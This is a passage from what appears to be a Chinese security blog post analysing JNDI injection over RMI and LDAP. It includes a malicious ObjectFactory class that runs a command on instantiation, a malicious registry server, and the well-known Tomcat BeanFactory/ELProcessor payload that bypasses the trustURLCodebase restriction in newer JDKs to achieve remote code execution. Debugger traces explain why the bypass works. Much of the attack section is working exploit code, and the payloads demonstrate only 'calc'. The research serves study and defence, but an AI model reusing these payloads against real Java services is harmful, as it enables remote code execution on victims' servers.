+<h3 id="0x02-JNDI-LDAP-攻击实现"><a href="#0x02-JNDI-LDAP-攻击实现" class="headerlink" title="0x02 JNDI+LDAP 攻击实现"></a>0x02 JNDI+LDAP 攻击实现</h3><p>先用 windows 上常用的 LDAP 服务器把 LDAP 服务搭上，这里我用是 apache LDAP	,首先 new 一个新的 LDAP 服务，然后在这个 LDAP 服务的基础上加上 LDAP 连接，目录结构如下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710070803294-b6d94bda-c880-42ac-81a3-1422ac72fc68.png#averageHue=%23f6f5f5&clientId=uad2256d1-92e8-4&from=paste&height=469&id=u070e807d&originHeight=704&originWidth=2559&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=125506&status=done&style=none&taskId=u706651e4-d8e4-4d9f-9a74-e24e60cd494&title=&width=1706" referrerpolicy="no-referrer" alt="image.png"><br>之后开始 JNDI 作用 LDAP 的代码实现<br>先写一个服务端（针对 LDAP 了，所以不用去加 ReferenceWrapper 去包装满足 RMI 的要求了）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI_LDAP_Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        InitialContext initialContext=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        Reference refObj=<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;RMIHello&quot;</span>,<span class="string">&quot;RMIHello&quot;</span>,<span class="string">&quot;http://localhost:8000/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;</span>,refObj);</span><br><span class="line">        System.out.println(<span class="string">&quot;LDAP服务器正在运行中&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后要注意恶意类的编写有所改变，不是针对 RMI 形式的攻击了，这里的是 LDAP，所以不用去继承 UnicastRef</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//远程工厂类</span></span><br><span class="line"><span class="comment">//如果是测试RMI-JNDI的攻击，请加上UnicastServerRefObject的继承</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIHello</span>  <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RMIHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后是客户端：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI_LDAP_Dynamic</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>实验没问题<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710070919465-19258383-2340-4a80-b2f0-a54d8eb5d7ab.png#averageHue=%233b454e&clientId=uad2256d1-92e8-4&from=paste&height=600&id=u7a3871d2&originHeight=900&originWidth=2096&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=532532&status=done&style=none&taskId=u62723e86-3d9a-459b-a6c1-03bc7bdb05b&title=&width=1397.3333333333333" referrerpolicy="no-referrer" alt="image.png"></p>
+<h4 id="1x01-攻击流程分析"><a href="#1x01-攻击流程分析" class="headerlink" title="1x01 攻击流程分析"></a>1x01 攻击流程分析</h4><p>其实整体和 RMI 很相似，只不过初步获取 Context 不同<br>这里我们依然断点打在 lookup 处<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071058356-c2c295c2-db7f-4659-981e-0c67f89e8acd.png#averageHue=%23494e5a&clientId=uad2256d1-92e8-4&from=paste&height=271&id=u87908237&originHeight=407&originWidth=1901&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=310136&status=done&style=none&taskId=u4feb1297-bf5b-480d-9859-4f3af19dd96&title=&width=1267.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>直接进 initialContext 的 lookup，先获取 context<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071131051-100276ea-3344-4d51-b632-a19ff2bc042e.png#averageHue=%23474d59&clientId=uad2256d1-92e8-4&from=paste&height=340&id=u9d94d7de&originHeight=510&originWidth=1751&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=389090&status=done&style=none&taskId=u628d085e-31d9-4bff-882d-ec28f69e7a2&title=&width=1167.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>之后返回出去开始调用 ldapURLContext 的 lookup 方法，跟进之后发现还是跟 RMIURLcontext 差不多，调用父类 GenericContext 的 lookup 方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071198229-57bc7af5-6bbe-44d3-867d-5562301ed5bf.png#averageHue=%234f5462&clientId=uad2256d1-92e8-4&from=paste&height=196&id=u8ee46423&originHeight=294&originWidth=1820&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=216592&status=done&style=none&taskId=u36a5fe8f-1d4a-4770-a431-e1f051d483a&title=&width=1213.3333333333333" referrerpolicy="no-referrer" alt="image.png"></p>
+<p>前面获取解析结果 ldapCtx 就不跟进了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071268093-eb1c57f1-2c7a-4f5b-a11f-f71aee626bb8.png#averageHue=%23484e5a&clientId=uad2256d1-92e8-4&from=paste&height=338&id=u21e67fc8&originHeight=507&originWidth=1795&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=390701&status=done&style=none&taskId=u67da0f43-b9c0-4028-9c13-40dd3a97f4f&title=&width=1196.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>直接进它的 lookup<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071458532-82346718-0253-4c35-8f3a-bd9368e00235.png#averageHue=%233e454f&clientId=uad2256d1-92e8-4&from=paste&height=349&id=ue55d6791&originHeight=524&originWidth=1863&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=424984&status=done&style=none&taskId=u50de15cf-7e09-40fb-889b-c1a06019e43&title=&width=1242" referrerpolicy="no-referrer" alt="image.png"><br>但是 ldapCtx 本身是没有 lookup 方法，还是得调它的父类（这里直接掉到了顶级父类）PartialCompositeContext 的 lookup 方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071601329-0c5a909c-2f35-44a3-9e7e-69758eb89918.png#averageHue=%233d454f&clientId=uad2256d1-92e8-4&from=paste&height=356&id=u13c50132&originHeight=534&originWidth=1991&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=449304&status=done&style=none&taskId=u06ec767f-bc3f-473e-b784-4290ba647b1&title=&width=1327.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>获取一堆信息，然后直接进 try，跟进 p_lookup<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071638706-df7c75fc-7232-4b59-96cc-108f8aa365d0.png#averageHue=%233d444e&clientId=uad2256d1-92e8-4&from=paste&height=386&id=u2d8fcc5f&originHeight=579&originWidth=2076&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=484265&status=done&style=none&taskId=uf1c3be4c-9af3-472f-824a-ff1b1f192ab&title=&width=1384" referrerpolicy="no-referrer" alt="image.png"><br>最后又一直向下调用 ComponentContext 的 c_lookup<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071723681-ab205012-bdb2-446b-941b-2fd1f6fcfd61.png#averageHue=%233d454f&clientId=uad2256d1-92e8-4&from=paste&height=336&id=u122b2ae0&originHeight=504&originWidth=2023&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=400987&status=done&style=none&taskId=u72ee599f-6d7a-4d85-8acf-1429ba6b423&title=&width=1348.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>跟进到最后熟悉的 DirectoryManager 的 getObjectInstance 了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071661410-a83c6be9-8f5a-4cf5-a667-e59606ac1a51.png#averageHue=%23474e5b&clientId=uad2256d1-92e8-4&from=paste&height=290&id=u1eb4fda0&originHeight=435&originWidth=2163&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=366601&status=done&style=none&taskId=ub0e6ebdf-d1f4-4567-9a76-416f72d3998&title=&width=1442" referrerpolicy="no-referrer" alt="image.png"><br>getObjectInstance 中跟进到 getObjectFactoryFromReference<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710073730270-d54002ce-5a16-4067-be1a-5229e83e0555.png#averageHue=%233d444d&clientId=ufd46421e-3273-4&from=paste&height=403&id=uc2822095&originHeight=605&originWidth=1325&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=323398&status=done&style=none&taskId=u411e3294-78ec-49e6-a950-221a0586092&title=&width=883.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>之后就是动态类加载了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710074151159-461a15d5-d65c-4b1a-8e26-aeeaf39880be.png#averageHue=%233c424b&clientId=ufd46421e-3273-4&from=paste&height=324&id=u3050fcb1&originHeight=486&originWidth=1157&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=225130&status=done&style=none&taskId=u8d4864a7-0c7a-4eda-bfeb-9d7d17d1c17&title=&width=771.3333333333334" referrerpolicy="no-referrer" alt="image.png"></p>
+<h2 id="JNDI-注入高版本绕过"><a href="#JNDI-注入高版本绕过" class="headerlink" title="JNDI 注入高版本绕过"></a>JNDI 注入高版本绕过</h2><h3 id="0x01-JNDI-RMI-限制"><a href="#0x01-JNDI-RMI-限制" class="headerlink" title="0x01 JNDI-RMI 限制"></a>0x01 JNDI-RMI 限制</h3><p>JDK 6u132, JDK 7u122, JDK 8u113之后Java限制了通过RMI远程加载Reference工厂类。<br>估计师傅们自己在测试的时候应该也遇到了这个问题，也就是报错<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710074773573-de02eea7-6076-4ef1-96ae-5ccda0164839.png#averageHue=%233a414a&clientId=ufd46421e-3273-4&from=paste&height=37&id=ucc526e2e&originHeight=55&originWidth=1771&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=59803&status=done&style=none&taskId=u585743a5-06f2-437b-ab09-d68bb6c3c1e&title=&width=1180.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为了false，即默认不允许通过RMI从远程的Codebase加载Reference工厂类。</p>
+<h4 id="1x01-源码分析"><a href="#1x01-源码分析" class="headerlink" title="1x01 源码分析"></a>1x01 源码分析</h4><p>相信经过上面的攻击流程分析，师傅们应该可以确定，JNDI-RMI 的远程攻击进入开始阶段是在<code>RegistryContext#decodeObject()</code>中<br>对比 8u65 和 8u202 的源码不同</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710075083827-b41f01c2-b3f3-4ff2-9f8e-e3d06cd468ed.png#averageHue=%233c444d&clientId=ufd46421e-3273-4&from=paste&height=373&id=QOQi4&originHeight=559&originWidth=1715&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=419213&status=done&style=none&taskId=u40670ce5-2e97-4c05-a3cc-d4018f964fc&title=&width=1143.3333333333333" referrerpolicy="no-referrer" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710075061235-86de9153-2e0c-40bd-90dd-e8ea109cc24d.png#averageHue=%233c434c&clientId=ufd46421e-3273-4&from=paste&height=332&id=p3Luk&originHeight=498&originWidth=2120&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=430563&status=done&style=none&taskId=u3701d801-4fe8-4b7c-9270-cb23be77c27&title=&width=1413.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>多了一层对于类型的限制以及远程 trustURLCodebase 的检查，基本上远程 codebase 都不会被允许加载了，所以我们得另辟蹊径，首先加载本地的 factory，然后再利用这个本地的 factory 去加载远程类</p>
+<h3 id="0x02-JNDI-LDAP-限制"><a href="#0x02-JNDI-LDAP-限制" class="headerlink" title="0x02 JNDI-LDAP 限制"></a>0x02 JNDI-LDAP 限制</h3><p>同样包下的 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>也被默认值设置为了 false，限制相同，绕过方式也相同</p>
+<h3 id="0x03-绕过实现分析"><a href="#0x03-绕过实现分析" class="headerlink" title="0x03 绕过实现分析"></a>0x03 绕过实现分析</h3><p>我们以 RMI 的绕过为前期绕过分析对象，实际上两者共用一套绕过逻辑<br>首先这个本地工厂类必须实现 ObjectFactory，这是一直从 JNDI 注入开始利用类就满足的一个条件，在写利用类的时候应该也发现如果实现ObjectFactory 就必须要实现 getObjectInstance 方法。然后这个工厂类实例化我们的恶意类的方法参数必须可控<br>综合上面的条件，在 Tomcat8 的依赖包中有一个 <code>BeanFactory</code>满足前置的两个条件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710076244495-e4273533-a63b-4291-9689-5aff08e3ebae.png#averageHue=%233e434c&clientId=ufd46421e-3273-4&from=paste&height=396&id=xkoeo&originHeight=594&originWidth=1095&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=302890&status=done&style=none&taskId=u4f94613c-37f0-4fbc-9bf8-35de321b0b3&title=&width=730" referrerpolicy="no-referrer" alt="image.png"><br>观察他的 getObjectInstance 方法，发现有一个限制：我们实例化生产的类必须是 ResouceRef 类型，不然无法进入方法的 trycatch 块处理逻辑<br>什么是 ResourceRef 呢？在 javaweb 或者 springmvc 项目中，我们在 web.xml 中见的很多，用来引入外部资源的,而 EL 表达式其实就是 ELEMENT 元素表达式，在 web.xml 中用来加载外部资源<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710122431753-8cca3d68-4b80-4b94-b12e-fffbe78ccd3f.png#averageHue=%23f8f6f5&clientId=u4c4ac00c-9379-4&from=paste&height=353&id=b8lqt&originHeight=529&originWidth=1076&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=123239&status=done&style=none&taskId=ucef05d10-dd93-435f-a89d-46e1ce024a5&title=&width=717.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>我们看看 ResourceRef 的具体定义和内容<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710122589034-4fe48556-16ab-41e8-80cd-575128841e6f.png#averageHue=%23464c51&clientId=u4c4ac00c-9379-4&from=paste&height=287&id=D9P8o&originHeight=430&originWidth=1241&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=214163&status=done&style=none&taskId=u752002ac-76a5-454c-8d38-7b07c1cbe37&title=&width=827.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>简单来说它也是一种引用 wrapper，也就是用来包装指定类的各类信息，还包括了用来加载该类的 factory 工厂地址（为什么是 factory 呢？具体思考 javaweb 和 SSM 这一套管理类的逻辑），而且都是我们可控的，这就很巧，我们就是需要一个从本地加载 factory 类—&gt;beanfactory<br>总结一下就是：我们用 ResourceRef 包装一下 ELProcessor 和指定加载它的beanfactory，之后让 beanfactory 去实例化 ELProcessor，调用 EL 的 eval 方法，触发 RCE</p>
+<h4 id="1x03-代码实现"><a href="#1x03-代码实现" class="headerlink" title="1x03 代码实现"></a>1x03 代码实现</h4><p>可以先写一个恶意服务端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIbyPass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        InitialContext initialContext=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="comment">//Reference refObj=new Reference(&quot;evilref&quot;,&quot;evilref&quot;,&quot;http://localhost:8000/&quot;);</span></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance()&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]&quot;</span> +</span><br><span class="line">                <span class="string">&quot;([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">        <span class="comment">//initialContext.rebind(&quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;,ref);</span></span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteobj&quot;</span>,ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后写一个受害者</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI_Dynamic</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/remoteobj&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"></span><br><span class="line">        initialContext.lookup(string);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行起来应该没有问题，复现时要注意 java 中的 eval 能不能直接加载 runtime 类进行命令执行，以及 EL 的依赖是否打上了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123145331-ef2cdb6e-e90e-4a9b-9618-fbc8cedfa7a5.png#averageHue=%23424748&clientId=u4c4ac00c-9379-4&from=paste&height=575&id=uJi96&originHeight=863&originWidth=1872&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=398445&status=done&style=none&taskId=u62fccede-570e-4996-8722-478466e0a80&title=&width=1248" referrerpolicy="no-referrer" alt="image.png"></p>
+<h4 id="1x04-流程分析"><a href="#1x04-流程分析" class="headerlink" title="1x04 流程分析"></a>1x04 流程分析</h4><p>断点依然是打在 lookup 中，但是这里我们就直接进 lookup 了，getURLOrDefaultInitCtx 返回出来依然是 rmiURLContext<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123229340-1b140ec6-ce30-4eee-a528-947bbee3466b.png#averageHue=%233c4752&clientId=u4c4ac00c-9379-4&from=paste&height=136&id=KhvWG&originHeight=204&originWidth=1705&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=120128&status=done&style=none&taskId=u1476a04e-cdfc-49f7-a0bc-e02f98a44b6&title=&width=1136.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>逻辑照旧<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123280748-273795fe-0d93-465b-966e-64e4bcf19a13.png#averageHue=%233c4248&clientId=u4c4ac00c-9379-4&from=paste&height=417&id=RT3Oi&originHeight=626&originWidth=1773&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=404425&status=done&style=none&taskId=u33155071-6488-45c8-902c-8e6e234cd70&title=&width=1182" referrerpolicy="no-referrer" alt="image.png"><br>由于是 RMI 的 context ，所以直接就跟进到 RegistryContext 的 lookup<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123331633-9aa43ccd-e558-451f-b9c4-1201506076e2.png#averageHue=%233c4248&clientId=u4c4ac00c-9379-4&from=paste&height=395&id=B7uJJ&originHeight=592&originWidth=1684&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=424177&status=done&style=none&taskId=u68917654-f221-4a52-98a8-9084f350c97&title=&width=1122.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>通过 RMI 原生获取到字节码之后，再调用 decodeObject 方法<br>关键性逻辑在第一句，这里会判断我们传进来的要实例化的对象是否是 RemoteRef 类，如果是的话，那我们这个流程就肯定没有后续了，因为它会将实例化对象强转为 RemoteReference 类型，会自带 classFactoryLocation 属性字段，后面的 if 判断就过不去了，这就是为什么我们要选择 ResourceRef 的原因<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123376134-6afb9763-0993-46fa-8225-bd45b22fb056.png#averageHue=%233a4147&clientId=u4c4ac00c-9379-4&from=paste&height=349&id=Azumj&originHeight=524&originWidth=2161&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=438120&status=done&style=none&taskId=u902455fd-e7a8-4468-8ae7-16aa76b8705&title=&width=1440.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>继续往下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123537043-71d47d26-99e5-406d-8add-641a1dd32e47.png#averageHue=%23464d53&clientId=u4c4ac00c-9379-4&from=paste&height=416&id=goq0q&originHeight=624&originWidth=2203&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=664069&status=done&style=none&taskId=u8105e9b6-1e3b-4414-8b57-decaa138869&title=&width=1468.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>来到最为关键的 if 判断，由于我们的指定实例化类是 ResourceRef，不带 classFactoryLocation 属性，所以三个判断条件中，第二个判断条件不符合要求，与运算不通过，可以开开心心进行类加载了<br>那么直接跟进 NamingManager 的 getObjectInstance 方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123802662-83b41c63-705f-4916-a18c-8a8370980250.png#averageHue=%233a4045&clientId=u4c4ac00c-9379-4&from=paste&height=210&id=EYkUs&originHeight=571&originWidth=2262&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=467312&status=done&style=none&taskId=uf299781c-9080-42c1-beab-1a2a03d3e9e&title=&width=830" referrerpolicy="no-referrer" alt="image.png"><br>首先对其强转为 Reference 类，然后直接通过getFactoryClassName 获取到工厂类的全类名（此时是<code>org.apache.naming.factory.BeanFactory</code>），调用<code>getObjectFactoryFromReference</code>先对它进行类加载<br>然后开始调用工厂类的<code>getObjectInstance</code>对类实现实例化加载<br>这里稍微看一下变量表<br><img 